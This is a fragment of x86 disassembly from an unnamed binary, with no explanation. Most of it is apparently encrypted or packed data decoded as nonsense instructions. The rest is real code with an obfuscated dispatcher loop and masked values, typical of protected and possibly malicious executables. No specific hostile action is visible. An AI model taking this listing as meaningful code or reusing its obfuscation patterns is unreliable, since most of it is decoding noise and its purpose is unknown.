  40eb6f:	fisttp QWORD PTR [ecx+0x5cdf58b2]
  40eb75:	pop    edi
  40eb76:	xchg   BYTE PTR [edx],al
  40eb78:	mov    bl,0x1a
  40eb7a:	and    DWORD PTR [esi],ebp
  40eb7c:	into   
  40eb7d:	dec    esp
  40eb7e:	inc    esp
  40eb7f:	sahf   
  40eb80:	test   BYTE PTR [eax-0x27],cl
  40eb83:	loope  0x40ebde
  40eb85:	fdivr  QWORD PTR [ebx-0x55]
  40eb88:	xor    BYTE PTR [ecx+ebx*8],cl
  40eb8b:	shl    BYTE PTR fs:0x7d9aa79a,cl
  40eb92:	xchg   esi,eax
  40eb93:	pop    edx
  40eb94:	pusha  
  40eb95:	cmp    al,BYTE PTR [esi]
  40eb97:	dec    ebp
  40eb98:	adc    DWORD PTR [ecx-0x5d988339],0xae0d7fe8
  40eba2:	dec    BYTE PTR [ebp+0x24]
  40eba5:	push   0xfc8ae918
  40ebaa:	mov    dh,0x45
  40ebac:	jmp    0x40eb8f
  40ebae:	xchg   ebx,eax
  40ebaf:	jns    0x40eb3a
  40ebb1:	mov    ch,0x9e
  40ebb3:	sbb    eax,0x65cad771
  40ebb8:	js     0x40eb43
  40ebba:	imul   esp,DWORD PTR [edx+eiz*8-0x784ad004],0x12
  40ebc2:	mov    bh,0x8c
  40ebc4:	cli    
  40ebc5:	mov    edi,0xfe494559
  40ebca:	mov    dl,0x5e
  40ebcc:	push   edx
  40ebcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ebce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ebcf:	rcl    BYTE PTR [esi-0x5b],1
  40ebd2:	jno    0x40ec41
  40ebd4:	push   ebx
  40ebd5:	mov    ecx,0x724427b3
  40ebda:	loopne 0x40ebb5
  40ebdc:	outs   dx,BYTE PTR ds:[esi]
  40ebdd:	pop    ss
  40ebde:	cld    
  40ebdf:	inc    ebx
  40ebe0:	fiadd  DWORD PTR [esi-0xd]
  40ebe3:	aaa    
  40ebe4:	jb     0x40ebb5
  40ebe6:	jecxz  0x40eb8f
  40ebe8:	aaa    
  40ebe9:	imul   edx,DWORD PTR [esi],0xffffffc1
  40ebec:	aad    0x98
  40ebee:	pop    edx
  40ebef:	repz inc eax
  40ebf1:	push   0xd61816b
  40ebf6:	dec    eax
  40ebf7:	xor    eax,0x14ac4344
  40ebfc:	bound  ebp,QWORD PTR [eax]
  40ebfe:	pop    ecx
  40ebff:	popf   
  40ec00:	mov    eax,ds:0x366865fe
  40ec05:	pop    edx
  40ec06:	jno    0x40ec7c
  40ec08:	inc    edi
  40ec09:	sbb    dh,cl
  40ec0b:	imul   ebx,DWORD PTR [ebp+0x7efc633d],0x5d
  40ec12:	in     eax,dx
  40ec13:	cdq    
  40ec14:	xlat   BYTE PTR ds:[ebx]
  40ec15:	lock push eax
  40ec17:	ja     0x40ebf9
  40ec19:	icebp  
  40ec1a:	mov    ds:0x36968966,al
  40ec1f:	adc    bl,BYTE PTR [esp+edx*2-0x80]
  40ec23:	fs mov ebx,0x8fe10337
  40ec29:	mov    ebx,0x809ff4d3
  40ec2e:	adc    DWORD PTR [ecx-0x36],ebx
  40ec31:	bound  edx,QWORD PTR [ebp-0x42060db]
  40ec37:	push   edi
  40ec38:	add    al,0xa8
  40ec3a:	mov    al,ds:0x818ca6d1
  40ec3f:	dec    ebp
  40ec40:	fsubrp st(5),st
  40ec42:	hlt    
  40ec43:	mul    BYTE PTR [esi-0x795303fc]
  40ec49:	xchg   esp,eax
  40ec4a:	jnp    0xeb46b350
  40ec50:	aaa    
  40ec51:	inc    ebx
  40ec52:	add    BYTE PTR [edi+edi*1+0x45890000],dl
  40ec59:	in     al,dx
  40ec5a:	mov    DWORD PTR ds:0x4337b3,0x877
  40ec64:	mov    eax,ds:0x413c66
  40ec69:	mov    DWORD PTR ds:0x43372f,0x4b6e
  40ec73:	mov    eax,DWORD PTR [eax]
  40ec75:	mov    DWORD PTR ds:0x433833,0x73ce
  40ec7f:	mov    DWORD PTR [ebp-0x18],eax
  40ec82:	mov    DWORD PTR ds:0x43383f,0x7077
  40ec8c:	jmp    0x40f1ad
  40ec91:	cmp    edi,0x33d
  40ec97:	jne    0x40f120
  40ec9d:	and    DWORD PTR [ebp+0x8],0x0
  40eca1:	mov    eax,DWORD PTR [ebp-0x8]
  40eca4:	sub    eax,DWORD PTR [ebp+0x8]
  40eca7:	push   eax
  40eca8:	mov    eax,DWORD PTR [ebp-0x4]
  40ecab:	add    eax,DWORD PTR [ebp+0x8]
  40ecae:	push   eax
  40ecaf:	jmp    0x40eedc
  40ecb4:	es addr16 mov esi,0x2465bf5c
  40ecbb:	gs mov dh,0x91
  40ecbe:	test   BYTE PTR [ebp+eiz*1-0x553203],bl
  40ecc5:	mov    eax,ds:0x7c0e7e7e
  40ecca:	jle    0x40ed4a
  40eccc:	inc    ecx
  40eccd:	cmp    al,0x2f
  40eccf:	xchg   BYTE PTR [eax+0x27],bl
  40ecd2:	xchg   ebx,eax
  40ecd3:	imul   edx,DWORD PTR [eax-0x13],0x29
  40ecd7:	add    DWORD PTR [eax+0x615c3fd3],ebp
  40ecdd:	mov    WORD PTR [edi-0x22],fs
  40ece0:	(bad)  
  40ece1:	push   ss
  40ece2:	pusha  
  40ece3:	sbb    dl,cl
  40ece5:	push   0xffffffa6
  40ece7:	xchg   ebp,eax
  40ece8:	mov    esi,0xfd77b46c
  40eced:	xchg   BYTE PTR [edx+eax*2],bl
  40ecf0:	scas   eax,DWORD PTR es:[edi]
  40ecf1:	(bad)  
  40ecf2:	mov    dl,0x55
  40ecf4:	in     eax,0xd9
  40ecf6:	jo     0x40ec8d
  40ecf8:	cmc    
  40ecf9:	mov    ds:0xb56fbdc1,al
  40ecfe:	xchg   edx,eax
  40ecff:	xchg   ebp,eax
  40ed00:	sub    BYTE PTR [edx],al
  40ed02:	add    ah,dh
  40ed04:	cmp    eax,0xe7673065
  40ed09:	inc    ecx
  40ed0a:	sar    BYTE PTR [ebx-0x64],cl
  40ed0d:	out    0xa8,eax
  40ed0f:	(bad)  
  40ed10:	(bad)  
  40ed12:	enter  0x8e0,0x21
  40ed16:	daa    
  40ed17:	add    DWORD PTR [edi],ebx
  40ed19:	inc    edx
  40ed1a:	or     al,BYTE PTR [edx-0x7d]
  40ed1d:	mov    edi,ecx
  40ed1f:	inc    ecx
  40ed20:	adc    BYTE PTR [edx+0x62],dl
  40ed23:	pop    ecx
  40ed24:	js     0x40eca6
  40ed26:	cmp    BYTE PTR [edi+0x23],bh
  40ed29:	pop    edi
  40ed2a:	in     al,dx
  40ed2b:	sub    cl,BYTE PTR [esi-0x16]
  40ed2e:	pop    edx
  40ed2f:	call   0x540a:0x9bf9
  40ed35:	xchg   ebx,eax
  40ed36:	(bad)  
  40ed37:	out    0x33,al
  40ed39:	sti    
  40ed3a:	xchg   ebp,eax
  40ed3b:	dec    ebp
  40ed3c:	or     eax,0xd9ee35b6
  40ed41:	lahf   
  40ed42:	mov    ecx,edi
  40ed44:	leave  
  40ed45:	jae    0x40ed21
  40ed47:	mov    ds:0x5d277a8a,eax
  40ed4c:	loope  0x40ed9a
  40ed4e:	inc    ebx
  40ed4f:	or     BYTE PTR [ecx],bh
  40ed51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed52:	call   0xe8b136ee
  40ed57:	jmp    0xe9cd:0x3bbdf16c
  40ed5e:	sbb    eax,0xc743502e
  40ed63:	daa    
  40ed64:	fs aam 0x90
  40ed67:	lds    eax,FWORD PTR [edx+ebx*2-0x27]
  40ed6b:	je     0x40edde
  40ed6d:	sub    bh,dl
  40ed6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed70:	aad    0x85
  40ed72:	cs inc ecx
  40ed74:	(bad)  
  40ed75:	repnz sub eax,DWORD PTR [edi+0xd]
  40ed79:	jmp    0x40ed46
  40ed7b:	into   
  40ed7c:	rol    ebx,cl
  40ed7e:	cmp    al,0x6d
  40ed80:	xchg   ebx,eax
  40ed81:	mov    edi,0xcec67323
  40ed86:	hlt    
  40ed87:	mov    ds:0x804af160,eax
  40ed8c:	sub    DWORD PTR [esi+0x3aab37c4],ecx
  40ed92:	cmp    BYTE PTR [eax+edi*4],bh
  40ed95:	lds    esi,FWORD PTR [edx]
  40ed97:	jae    0x40ed74
  40ed99:	mov    al,ss:0x3a6145fd
  40ed9f:	ins    DWORD PTR es:[edi],dx
  40eda0:	in     eax,dx
  40eda1:	retf   
  40eda2:	out    0x7a,al
  40eda4:	imul   BYTE PTR [edi]
  40eda6:	lods   eax,DWORD PTR ds:[esi]
  40eda7:	push   ss
  40eda8:	jbe    0x40ed30
  40edaa:	dec    esi
  40edab:	mov    ebp,0xf4367a19
  40edb0:	xor    al,0xaa
  40edb2:	push   es
  40edb3:	pop    eax
  40edb4:	(bad)  
  40edb5:	push   0x42
  40edb7:	ror    DWORD PTR [edx],0x7b
  40edba:	sbb    DWORD PTR [edi-0x28],0x63d6791d
  40edc1:	rol    DWORD PTR [ebp+0x14bbcc40],cl
  40edc7:	iret   
  40edc8:	add    DWORD PTR [edi],0x84cde757
  40edce:	mov    ebp,0xbad2b6b1
  40edd3:	daa    
  40edd4:	mov    ebp,0xbf5e7596
  40edd9:	scas   al,BYTE PTR es:[edi]
  40edda:	xor    eax,0xeddc71de
  40eddf:	mov    bh,0xbe
  40ede1:	mov    bh,0x86
  40ede3:	fisub  WORD PTR [eax+0x41]
  40ede6:	addr16 jbe 0x40ed6a
  40ede9:	je     0x40edd5
  40edeb:	int    0xd1
  40eded:	adc    ecx,DWORD PTR [eax+eiz*1-0x73]
  40edf1:	push   ds
  40edf2:	cwde   
  40edf3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40edf4:	sub    eax,0x449dbfdb
  40edf9:	clc    
  40edfa:	rcl    DWORD PTR [esi],1
  40edfc:	in     eax,dx
  40edfd:	cdq    
  40edfe:	pushf  
  40edff:	jecxz  0x40ed94
  40ee01:	pushf  
  40ee02:	lahf   
  40ee03:	mov    cl,BYTE PTR [ebp+0x52c5f753]
  40ee09:	push   esp
  40ee0a:	das    
  40ee0b:	outs   dx,BYTE PTR ds:[esi]
  40ee0c:	mov    bl,0x7d
  40ee0e:	data16 je 0x40ee72
  40ee11:	pop    esp
  40ee12:	push   ebp
  40ee13:	inc    esi
  40ee14:	lahf   
  40ee15:	mov    ebx,0xed1cc27d
  40ee1a:	mov    ecx,0x77c9520c
  40ee1f:	cmp    eax,0x71326da6
  40ee24:	cmp    BYTE PTR [ebx],0x27
  40ee27:	(bad)
  40ee2a:	xchg   esi,eax
  40ee2b:	inc    ebp
  40ee2c:	test   ah,0x4a
  40ee2f:	mov    ds:0x686f9588,al
  40ee34:	and    DWORD PTR [ecx-0x1],ebp
  40ee37:	rdpmc  
  40ee39:	sbb    al,0x14
  40ee3b:	iret   
  40ee3c:	loop   0x40ee03
  40ee3e:	adc    BYTE PTR [edi],ah
  40ee40:	add    al,0x46
  40ee42:	pop    esp
  40ee43:	cdq    
  40ee44:	ds cdq 
  40ee46:	enter  0xa45b,0x37
  40ee4a:	sub    BYTE PTR [ebx-0x1a8e8f32],bh
  40ee50:	das    
  40ee51:	cwde   
  40ee52:	mov    bl,0xc
  40ee54:	fwait
  40ee55:	or     al,ch
  40ee57:	pushf  
  40ee58:	mov    edx,0xf134b899
  40ee5d:	icebp  
  40ee5e:	pop    ecx
  40ee5f:	sub    DWORD PTR [eax+0x62],ebp
  40ee62:	data16 popw es
  40ee65:	setnp  BYTE PTR [edx]
  40ee68:	gs or  bl,dl
  40ee6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee6c:	gs sti 
  40ee6e:	scas   al,BYTE PTR es:[edi]
  40ee6f:	cmp    BYTE PTR [ebp+0x4d251c0b],al
  40ee75:	xchg   esi,esi
  40ee77:	hlt    
  40ee78:	(bad)  
  40ee7a:	ret    0x7d12
  40ee7d:	rol    BYTE PTR [edi-0x4c],1
  40ee80:	mov    edx,DWORD PTR [esi]
  40ee82:	mov    WORD PTR [eax],ss
  40ee84:	ss push cs
  40ee86:	pop    eax
  40ee87:	lods   eax,DWORD PTR ds:[esi]
  40ee88:	out    dx,eax
  40ee89:	or     dh,BYTE PTR cs:[eax+0x319a24e4]
  40ee90:	jge    0x40ef01
  40ee92:	call   0x2155c59d
  40ee97:	mov    bl,0x56
  40ee99:	xchg   ecx,eax
  40ee9a:	cmp    eax,0x68db63f0
  40ee9f:	pop    esi
  40eea0:	push   0xf87cbac
  40eea5:	or     bh,BYTE PTR [esp+ebx*1]
  40eea8:	popa   
  40eea9:	aad    0xd9
  40eeab:	and    DWORD PTR [ebp+0x70],esp
  40eeae:	sbb    BYTE PTR [ecx+0x6d],0x9c
  40eeb2:	aaa    
  40eeb3:	jle    0x40ee53
  40eeb5:	in     al,dx
  40eeb6:	dec    eax
  40eeb7:	js     0x40eef6
  40eeb9:	mov    ebx,0x24263cff
  40eebe:	sbb    ebp,eax
  40eec0:	fisub  WORD PTR ds:0x2fb8b255
  40eec6:	stc    
  40eec7:	push   ebp
  40eec8:	mov    edi,0x232d8ea7
  40eecd:	mov    DWORD PTR [esi-0x46],ecx
  40eed0:	lds    ebx,FWORD PTR [edi+0x2a]
  40eed3:	ret    0x9c92
  40eed6:	outs   dx,BYTE PTR ds:[esi]
  40eed8:	pop    esi
  40eed9:	inc    eax
  40eeda:	inc    esp
  40eedb:	retf   
  40eedc:	call   0x404a7e
  40eee1:	inc    DWORD PTR [ebp+0x8]
  40eee4:	cmp    DWORD PTR [ebp+0x8],0x52
  40eee8:	jb     0x40eca1
  40eeee:	jmp    0x40f1ad
  40eef3:	jmp    0x40f120
  40eef8:	lds    ebp,FWORD PTR [edx+0x1371069f]
  40eefe:	imul   ecx,DWORD PTR gs:[ebx+0x6298ef46],0x8f38c98c
  40ef09:	scas   eax,DWORD PTR es:[edi]
  40ef0a:	jle    0x40ef8a
  40ef0c:	push   cs
  40ef0d:	jl     0x40ef8d
  40ef0f:	jle    0x40ef79
  40ef11:	jmp    0x4cec:0x6b949c99
  40ef18:	mov    DWORD PTR [edi-0xcb4b4f0],esp
  40ef1e:	push   ds
  40ef1f:	out    0x88,eax
  40ef21:	(bad)  
  40ef22:	jl     0x40efa0
  40ef24:	push   ss
  40ef25:	jg     0x40eeb2
  40ef27:	mov    BYTE PTR [edi+0x78016283],cl
  40ef2d:	push   DWORD PTR [esi+eax*8+0x6f18d7b9]
  40ef34:	int3   
  40ef35:	add    BYTE PTR [edx+0x7b45e281],dl
  40ef3b:	aas    
  40ef3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef3d:	sbb    al,0xc2
  40ef3f:	mov    eax,ds:0x9c1c8837
  40ef44:	push   ecx
  40ef45:	push   es
  40ef46:	and    DWORD PTR [ebx-0x60],edx
  40ef49:	sbb    BYTE PTR [edx],cl
  40ef4b:	xor    ah,BYTE PTR [ecx+0x6e031de6]
  40ef51:	add    cl,al
  40ef53:	sbb    ebp,DWORD PTR [ebx]
  40ef55:	inc    edx
  40ef56:	dec    ecx
  40ef57:	mov    DWORD PTR [esi+0x7e6794a6],eax
  40ef5d:	into   
  40ef5e:	(bad)
  40ef61:	idiv   BYTE PTR [ebx+0x24d62f2e]
  40ef67:	jle    0x40ef79
  40ef69:	mov    ecx,0xacc11516
  40ef6e:	lea    ebx,[eax]
  40ef70:	dec    ebp
  40ef71:	jno    0x40efdc
  40ef73:	mov    eax,0xad7e9539
  40ef78:	push   ecx
  40ef79:	outs   dx,DWORD PTR ds:[esi]
  40ef7a:	dec    edi
  40ef7b:	repnz adc esi,DWORD PTR [edx+0x44]
  40ef7f:	and    DWORD PTR [ecx-0xe],ecx
  40ef82:	imul   DWORD PTR [edi]
  40ef84:	outs   dx,BYTE PTR ds:[esi]
  40ef85:	rol    BYTE PTR [ecx-0x3c],1
  40ef88:	push   ebp
  40ef89:	fistp  QWORD PTR [esi+0x780e3b6]
  40ef8f:	mov    dl,0x96
  40ef91:	add    ebp,DWORD PTR [edi-0x3eef213]
  40ef97:	test   al,0x63
  40ef99:	xor    ecx,DWORD PTR [ebp+eiz*1+0x1a]
  40ef9d:	xchg   edx,eax
  40ef9e:	sbb    eax,0xb7bb60d4
  40efa3:	jl     0x40f004
  40efa5:	adc    bl,BYTE PTR [ebp+eiz*4-0x16]
  40efa9:	ret    
  40efaa:	mov    WORD PTR [ebx+0x41510653],?
  40efb0:	jecxz  0x40ef7f
  40efb2:	cld    
  40efb3:	out    0xc0,al
  40efb5:	ds icebp 
  40efb7:	lock adc eax,0xe70985bf
  40efbd:	xchg   edx,eax
  40efbe:	sub    BYTE PTR [esi],0xd
  40efc1:	les    esi,FWORD PTR [edx-0x27]
  40efc4:	repz jno 0x40ef7c
  40efc7:	push   ds
  40efc8:	ficomp WORD PTR [eax]
  40efca:	lds    ebx,FWORD PTR [edi]
  40efcc:	mov    edx,0x78dd2a18
  40efd1:	xor    eax,0x70ad5128
  40efd6:	xlat   BYTE PTR ds:[ebx]
  40efd7:	fdivrp st(2),st
  40efd9:	iret   
  40efda:	push   edx
  40efdb:	push   ss
  40efdc:	jmp    0xfaeec412
  40efe1:	sub    al,BYTE PTR [eax-0xb]
  40efe4:	push   esp
  40efe5:	xor    al,0x58
  40efe7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40efe8:	jae    0x40ef78
  40efea:	repz popf 
  40efec:	mov    cl,0xd9
  40efee:	out    dx,eax
  40efef:	pop    ecx
  40eff0:	into   
  40eff1:	jmp    0x40f05e
  40eff3:	jae    0x40efd5
  40eff5:	ins    DWORD PTR es:[edi],dx
  40eff6:	scas   al,BYTE PTR es:[edi]
  40eff7:	das    
  40eff8:	adc    eax,0x83ed71e8
  40effd:	adc    al,0x37
  40efff:	add    eax,0x2981f058
  40f004:	inc    esi
  40f005:	nop
  40f006:	in     eax,0xab
  40f008:	cmp    edi,eax
  40f00a:	push   ds
  40f00b:	pop    edi
  40f00c:	inc    edi
  40f00d:	leave  
  40f00e:	pop    ds
  40f00f:	rol    DWORD PTR [eax],1
  40f011:	repnz das 
  40f013:	test   al,0x51
  40f015:	(bad)  
  40f016:	cs pop eax
  40f018:	dec    ebx
  40f019:	lea    edx,[edx+0x14]
  40f01c:	adc    cl,0x45
  40f01f:	sub    ah,BYTE PTR [eax]
  40f021:	pop    esp
  40f022:	dec    edx
  40f023:	cld    
  40f024:	daa    
  40f025:	mov    eax,ds:0xd2cf5f79
  40f02a:	stos   BYTE PTR es:[edi],al
  40f02b:	stc    
  40f02c:	xchg   esp,eax
  40f02d:	daa    
  40f02e:	iret   
  40f02f:	(bad)  
  40f030:	call   0xa970677d
  40f035:	test   eax,0x12790aae
  40f03a:	adc    ecx,esi
  40f03c:	rcl    BYTE PTR cs:[ecx+0x54],0x3e
  40f041:	fnstcw WORD PTR [edi]
  40f043:	sub    DWORD PTR [edi],ecx
  40f045:	int    0x2c
  40f047:	mov    esp,0xa06646c2
  40f04c:	pop    esp
  40f04d:	ds dec edi
  40f04f:	imul   edi,DWORD PTR [eax],0xffffff8c
  40f052:	mov    esp,ebp
  40f054:	out    dx,al
  40f055:	hlt    
  40f056:	enter  0xaf21,0x69
  40f05a:	imul   ebp,ebx,0xba8304e8
  40f060:	push   es
  40f061:	adc    al,0x36
  40f063:	shr    DWORD PTR [ebp+0x18],cl
  40f066:	xor    dl,al
  40f068:	push   0xd564b4a
  40f06d:	retf   
  40f06e:	sub    ecx,DWORD PTR [edi+0x7f252d6d]
  40f074:	int    0x9e
  40f076:	ret    
  40f077:	inc    edi
  40f078:	jecxz  0x40f0a9
  40f07a:	sbb    BYTE PTR [ecx+eiz*8-0x4a],bl
  40f07e:	enter  0x3275,0x27
  40f082:	std    
  40f083:	mov    esp,esi
  40f085:	ror    BYTE PTR [esi+0x19],cl
  40f088:	xchg   esi,eax
  40f089:	pop    edi
  40f08a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f08b:	sub    BYTE PTR [edi+0x1f86be8f],0x74
  40f092:	inc    ebp
  40f093:	cmp    ebp,edx
  40f095:	jno    0x40f022
  40f097:	test   BYTE PTR [ebx],bl
  40f099:	and    al,0xc2
  40f09b:	xchg   edx,eax
  40f09c:	xchg   ecx,eax
  40f09d:	outs   dx,DWORD PTR ds:[esi]
  40f09e:	xchg   edi,eax
  40f09f:	cmp    DWORD PTR [eax+ebx*4-0x53],0xfffffff1
  40f0a4:	mov    ecx,0xc9f39a49
  40f0a9:	mov    al,ds:0xa935a4ae
  40f0ae:	xor    dl,BYTE PTR [edx]
  40f0b0:	jmp    0xc380a4c4
  40f0b5:	xchg   edx,eax
  40f0b6:	shr    DWORD PTR [ecx],1
  40f0b8:	sbb    al,0x62
  40f0ba:	call   0xb0a6:0x90ba8651
  40f0c1:	pop    ebp
  40f0c2:	(bad)  
  40f0c3:	hlt    
  40f0c4:	inc    esp
  40f0c5:	sub    ebp,0xffffff96
  40f0c8:	add    al,BYTE PTR [eax]
  40f0ca:	sub    ecx,DWORD PTR [eax-0x6dc7ee2b]
  40f0d0:	pushf  
  40f0d1:	(bad)  [edx+0x5d]
  40f0d4:	(bad)  [ebp-0x1a032cac]
  40f0da:	xchg   esi,eax
  40f0db:	cmc    
  40f0dc:	jo     0x40f11e
  40f0de:	or     esp,DWORD PTR gs:[eax+0x59]
  40f0e2:	int3   
  40f0e3:	cdq    
  40f0e4:	dec    esi
  40f0e5:	sub    DWORD PTR [ecx+0x55b19724],0x25b27cf2
  40f0ef:	xor    bl,0xa3
  40f0f2:	stos   BYTE PTR es:[edi],al
  40f0f3:	and    cl,dh
  40f0f5:	mov    ah,0x4c
  40f0f7:	xchg   ebx,eax
  40f0f8:	mov    edi,ss
  40f0fa:	loope  0x40f104
  40f0fc:	mov    ebx,0x36a9aa0f
  40f101:	push   ss
  40f102:	push   esp
  40f103:	cmp    cl,dh
  40f105:	outs   dx,DWORD PTR ds:[esi]
  40f106:	test   BYTE PTR [esi+0x3f1ebf6a],dh
  40f10c:	pop    esp
  40f10d:	mov    esp,0xedf9768b
  40f112:	xchg   ebx,eax
  40f113:	call   ebp
  40f115:	pop    es
  40f116:	cmp    esi,DWORD PTR [esi-0x44]
  40f119:	leave  
  40f11a:	jmp    0x40f0d2
  40f11c:	rcr    BYTE PTR [ecx-0x3b],0x7
  40f120:	cmp    edi,0x1a3
  40f126:	jne    0x40f17b
  40f12c:	mov    DWORD PTR [ebp-0x60],0xf89c853d
  40f133:	mov    eax,DWORD PTR [ebp-0x4]
  40f136:	mov    DWORD PTR [ebp-0x5c],eax
  40f139:	mov    eax,DWORD PTR [ebp-0x8]
  40f13c:	mov    DWORD PTR [ebp-0x58],eax
  40f13f:	mov    eax,DWORD PTR [ebp-0xc]
  40f142:	xor    eax,esi
  40f144:	add    eax,ebx
  40f146:	mov    DWORD PTR [ebp-0x54],eax
  40f149:	lea    eax,[ebp-0x1c]
  40f14c:	mov    DWORD PTR [ebp-0x50],eax
  40f14f:	mov    eax,DWORD PTR [ebp-0x60]
  40f152:	xor    eax,esi
  40f154:	add    eax,ebx
  40f156:	mov    DWORD PTR [ebp-0x60],eax
  40f159:	lea    eax,[ebp-0x60]
  40f15c:	push   eax
  40f15d:	mov    eax,DWORD PTR [ebp+0xc]
  40f160:	xor    eax,esi
  40f162:	add    eax,ebx
  40f164:	push   eax
  40f165:	mov    eax,ds:0x413bfe
  40f16a:	push   0x413b54
  40f16f:	push   DWORD PTR [eax]
  40f171:	call   0x40c099
  40f176:	jmp    0x40f1ad
  40f17b:	cmp    edi,0x13d
  40f181:	jne    0x40f1ad
  40f187:	mov    eax,DWORD PTR [ebp-0x10]
  40f18a:	xor    eax,esi
  40f18c:	add    eax,ebx
  40f18e:	mov    DWORD PTR [ebp+0x8],eax
  40f191:	mov    eax,ds:0x413bde
  40f196:	mov    DWORD PTR [ebp+0x8],eax
  40f199:	mov    eax,DWORD PTR [ebp-0x14]
  40f19c:	mov    DWORD PTR [ebp-0x4],eax
  40f19f:	mov    eax,DWORD PTR [ebp-0x4]
  40f1a2:	push   0x4
  40f1a4:	pop    ecx
  40f1a5:	sub    ecx,eax
  40f1a7:	add    ecx,DWORD PTR [ebp-0x18]
  40f1aa:	mov    DWORD PTR [ebp-0x8],ecx
  40f1ad:	mov    eax,DWORD PTR [ebp+0xc]
  40f1b0:	xor    eax,esi
  40f1b2:	lea    edi,[edi+eax*1+0x32729b]
  40f1b9:	cmp    edi,0x50b
  40f1bf:	jne    0x40ea09
  40f1c5:	mov    eax,DWORD PTR [ebp+0xc]
  40f1c8:	pop    edi
  40f1c9:	xor    eax,esi
  40f1cb:	jmp    0x40f3f8
  40f1d0:	push   edx
  40f1d1:	mov    ecx,0x7215e615
  40f1d6:	jno    0x40f241
  40f1d8:	scas   al,BYTE PTR es:[edi]
  40f1d9:	out    dx,al
  40f1da:	lds    esp,FWORD PTR [edx-0x7c7af207]
  40f1e0:	lahf   
  40f1e1:	lods   eax,DWORD PTR ds:[esi]
  40f1e2:	jle    0x40f262
  40f1e4:	push   cs
  40f1e5:	jl     0x40f265
  40f1e7:	jle    0x40f221
  40f1e9:	rol    eax,1
  40f1eb:	pushf  
  40f1ec:	mov    al,0x18
  40f1ee:	push   0xe4f6f614
  40f1f3:	xor    BYTE PTR [ebx+ebx*2+0x73],0x35
  40f1f8:	mov    al,ds:0x568d05e3
  40f1fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1fe:	xor    eax,0xc1731e5d
  40f203:	arpl   bx,sp
  40f205:	fisubr WORD PTR [edi+ebx*4+0x26]
  40f209:	push   eax
  40f20a:	in     eax,dx
  40f20b:	(bad)  
  40f20c:	push   0x4
  40f20e:	or     esp,DWORD PTR [edi-0x13355a9]
  40f214:	int3   
  40f215:	hlt    
  40f216:	sahf   
  40f217:	lock scas al,BYTE PTR es:[edi]
  40f219:	pop    eax
  40f21a:	xchg   BYTE PTR [esi+0x5d5afc61],ah
  40f220:	shl    DWORD PTR [ebx-0x3f],1
  40f223:	gs pop ds
  40f225:	test   al,0x49
  40f228:	aas    
  40f229:	xchg   edx,eax
  40f22a:	loop   0x40f239
  40f22c:	xchg   ecx,eax
  40f22d:	add    al,0xa9
  40f22f:	dec    esp
  40f230:	push   0x1f
  40f232:	cmp    al,0x0
  40f234:	push   eax
  40f235:	dec    eax
  40f236:	cmp    eax,0xb15a99b8
  40f23b:	mov    dl,0xc3
  40f23d:	sub    ebx,esp
  40f23f:	jp     0x40f292
  40f241:	adc    al,0x10
  40f243:	lods   al,BYTE PTR ds:[esi]
  40f244:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f245:	call   0xecee:0x255bdee9
  40f24c:	jle    0x40f1f8
  40f24e:	gs jp  0x40f1dd
  40f251:	sub    cl,BYTE PTR [edi+0x3a]
  40f254:	cmp    DWORD PTR [ebp+0x166ad12e],0x70
  40f25b:	cdq    
  40f25c:	fdiv   QWORD PTR [eax+0x52]
  40f25f:	push   es
  40f260:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f261:	addr16 fwait
  40f263:	sub    BYTE PTR [eax],bh
  40f265:	scas   eax,DWORD PTR es:[edi]
  40f266:	push   ds
  40f267:	inc    eax
  40f268:	inc    edi
  40f269:	dec    edx
  40f26a:	out    0x6d,al
  40f26c:	push   ebx
  40f26d:	sar    BYTE PTR [ebx],0xaa
  40f270:	jmp    0xa17ac0b8
  40f275:	iret   
  40f276:	jno    0x40f2ba
  40f278:	xor    al,0x4f
  40f27a:	fadd   st,st(0)
  40f27c:	sar    BYTE PTR [ebx+0x2e8cf5a1],1
  40f282:	pusha  
  40f283:	and    eax,0xab955431
  40f288:	push   ecx
  40f289:	xchg   ebx,eax
  40f28a:	aas    
  40f28b:	int3   
  40f28c:	mov    al,0x33
  40f28e:	dec    eax
  40f28f:	sahf   
  40f290:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f291:	fisub  WORD PTR [esi-0x13feaddc]
  40f297:	cli    
  40f298:	mov    dh,0x2
  40f29a:	cwd    
  40f29c:	adc    dl,dh
  40f29e:	je     0x40f29f
  40f2a0:	repz push 0x3b
  40f2a3:	mov    edx,esp
  40f2a5:	(bad)  
  40f2a6:	and    al,0x8c
  40f2a8:	pop    DWORD PTR [edx+0xd]
  40f2ab:	inc    ebp
  40f2ac:	sub    DWORD PTR [edi-0x30333cf6],ebx
  40f2b2:	iret   
  40f2b3:	pop    ds
  40f2b4:	je     0x40f2ba
  40f2b6:	stos   DWORD PTR es:[edi],eax
  40f2b7:	pop    eax
  40f2b8:	add    bl,cl
  40f2ba:	ficom  WORD PTR [eax+0x8710337]
  40f2c0:	test   al,0x9
  40f2c2:	imul   esp,DWORD PTR [ecx],0xffffffc7
  40f2c5:	xor    al,0xfb
  40f2c7:	sbb    eax,0xaff5242e
  40f2cc:	dec    ebx
  40f2cd:	out    dx,eax
  40f2ce:	into   
  40f2cf:	cld    
  40f2d0:	add    eax,0x4b6cd1c2
  40f2d5:	mov    ecx,DWORD PTR [esi+ebp*4+0x5b404e4c]
  40f2dc:	popa   
  40f2dd:	shl    DWORD PTR [ecx-0x4],1
  40f2e0:	mov    ch,BYTE PTR [esi-0x754c9838]
  40f2e6:	or     ch,BYTE PTR [esi-0x3dcad351]
  40f2ec:	adc    al,0x68
  40f2ee:	std    
  40f2ef:	ds jecxz 0x40f2ef
  40f2f2:	adc    ebp,esi
  40f2f4:	(bad)
  40f2f8:	xchg   esp,eax
  40f2f9:	jl     0x40f302
  40f2fb:	ins    DWORD PTR es:[edi],dx
  40f2fc:	or     ch,bh
